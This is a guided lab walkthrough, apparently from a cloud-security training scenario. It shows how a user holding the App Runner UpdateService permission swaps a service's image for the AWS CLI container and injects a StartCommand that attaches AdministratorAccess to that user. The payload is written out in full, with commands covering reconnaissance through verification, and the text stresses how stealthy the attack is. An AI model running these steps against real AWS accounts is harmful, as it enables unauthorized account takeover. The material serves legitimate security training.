# Guided Walkthrough: Privilege Escalation via apprunner:UpdateService

This scenario demonstrates a privilege escalation vulnerability where a user with `apprunner:UpdateService` permission can exploit an existing AWS App Runner service that has a privileged role attached. Unlike creating a new service from scratch, this attack leverages pre-existing infrastructure by updating the service configuration to execute arbitrary commands with the service's administrative permissions.

The attacker modifies two key aspects of the service configuration: the container image (changing to the AWS CLI container) and the `StartCommand` (setting it to execute IAM commands). When the service updates and restarts, it executes the attacker's commands with the privileged role's permissions, granting the attacker administrator access.

This attack is particularly stealthy because it exploits legitimate infrastructure already present in the environment. Security teams may overlook the risk of `apprunner:UpdateService` permission, focusing instead on service creation capabilities. Additionally, the attack leaves minimal traces beyond normal service update operations, making it harder to distinguish from routine maintenance activities.

**Technical Note**: The public AWS CLI container (`public.ecr.aws/aws-cli/aws-cli:latest`) has its entrypoint set to `/usr/local/bin/aws`, which means any `StartCommand` provided to App Runner is interpreted as arguments to the AWS CLI. This allows us to execute AWS CLI commands directly without needing to specify `/bin/bash` or shell wrappers. The privilege escalation happens immediately when the container starts during the service update — the service doesn't need to pass health checks or stay running for the attack to succeed.

## The Challenge

You start as `pl-prod-apprunner-002-to-admin-starting-user`, an IAM user whose credentials you've obtained. This user has a single notable permission: `apprunner:UpdateService` scoped to the existing service `pl-prod-apprunner-002-to-admin-target-service`. That service is currently running a benign nginx container and has the role `pl-prod-apprunner-002-to-admin-target-role` attached — a role with administrator-level IAM permissions.

Your goal is to achieve administrator access to the AWS account. You cannot create new App Runner services, you cannot directly assume the privileged role, and you cannot call IAM APIs directly. But you can update the existing service.

## Reconnaissance

First, confirm your identity and establish that you lack administrative permissions:

```bash
aws sts get-caller-identity --query 'Arn' --output text
# arn:aws:iam::{account_id}:user/pl-prod-apprunner-002-to-admin-starting-user

aws iam list-users --max-items 1
# An error occurred (AccessDenied) ...
```

Good — you are who you expect to be, and you don't have IAM permissions yet. Now let's look at what's available. Use your helpful `apprunner:ListServices` and `apprunner:DescribeService` permissions to find the target:

```bash
aws apprunner list-services \
  --query "ServiceSummaryList[?ServiceName=='pl-prod-apprunner-002-to-admin-target-service'].ServiceArn" \
  --output text
# arn:aws:apprunner:{region}:{account_id}:service/pl-prod-apprunner-002-to-admin-target-service/{id}

aws apprunner describe-service \
  --service-arn <SERVICE_ARN> \
  --query 'Service.{Image:SourceConfiguration.ImageRepository.ImageIdentifier,Role:InstanceConfiguration.InstanceRoleArn}' \
  --output json
```

The output will show:
- **Image**: something like `nginx:latest` — a harmless container doing nothing interesting
- **Role**: `arn:aws:iam::{account_id}:role/pl-prod-apprunner-002-to-admin-target-role` — a privileged role with IAM modification capabilities

That role is the key. If you can make the service run code you control, it will run that code as the privileged role.

## Exploitation

App Runner lets you specify a `StartCommand` — a command that overrides the container's default entrypoint arguments at startup. When you update the service to use the AWS CLI container (`public.ecr.aws/aws-cli/aws-cli:latest`), the entrypoint is `/usr/local/bin/aws`. Any `StartCommand` you provide becomes the arguments passed directly to `aws`.

So `StartCommand: iam attach-user-policy --user-name pl-prod-apprunner-002-to-admin-starting-user --policy-arn arn:aws:iam::aws:policy/AdministratorAccess` translates to:

```
/usr/local/bin/aws iam attach-user-policy \
  --user-name pl-prod-apprunner-002-to-admin-starting-user \
  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
```

...executed as the privileged service role. Build the update payload:

```bash
cat > /tmp/apprunner-update-config.json << 'EOF'
{
  "ServiceArn": "<SERVICE_ARN>",
  "SourceConfiguration": {
    "ImageRepository": {
      "ImageIdentifier": "public.ecr.aws/aws-cli/aws-cli:latest",
      "ImageRepositoryType": "ECR_PUBLIC",
      "ImageConfiguration": {
        "Port": "80",
        "StartCommand": "iam attach-user-policy --user-name pl-prod-apprunner-002-to-admin-starting-user --policy-arn arn:aws:iam::aws:policy/AdministratorAccess"
      }
    },
    "AutoDeploymentsEnabled": false
  }
}
EOF

aws apprunner update-service \
  --cli-input-json file:///tmp/apprunner-update-config.json \
  --output json
```

App Runner will acknowledge the update and begin redeploying the service. The `UpdateService` API call returns immediately, but the actual container swap takes 3–5 minutes. Poll the status:

```bash
aws apprunner describe-service \
  --service-arn <SERVICE_ARN> \
  --query 'Service.Status' \
  --output text
# OPERATION_IN_PROGRESS ... then RUNNING
```

Once the service reaches `RUNNING` status, the `StartCommand` has already been executed. The AWS CLI container ran, called `iam attach-user-policy` as the privileged role, and exited. The IAM policy change is done.

Wait 15 seconds for IAM policy propagation, then verify.

## Verification

```bash
aws iam list-users --max-items 3 --output table
```

If you see a table of IAM users, you now have `AdministratorAccess`. The `iam:ListUsers` call was previously denied — it succeeded because App Runner ran your injected command and attached the `AdministratorAccess` managed policy to your starting user.

You can also confirm directly:

```bash
aws iam list-attached-user-policies \
  --user-name pl-prod-apprunner-002-to-admin-starting-user \
  --query 'AttachedPolicies[].PolicyName' \
  --output text
# AdministratorAccess
```

## What Happened

The attack chain was: `pl-prod-apprunner-002-to-admin-starting-user` used `apprunner:UpdateService` to swap the running container and inject a `StartCommand`. When App Runner redeployed the service, it executed the command as `pl-prod-apprunner-002-to-admin-target-role` — a role with full IAM permissions — which attached `AdministratorAccess` to the starting user.

In real environments this pattern appears whenever a developer needs to iterate on an App Runner service and is granted `UpdateService` without appreciating that the service's instance role scope becomes their effective blast radius. One over-privileged instance role transforms a routine service update permission into a full account takeover.
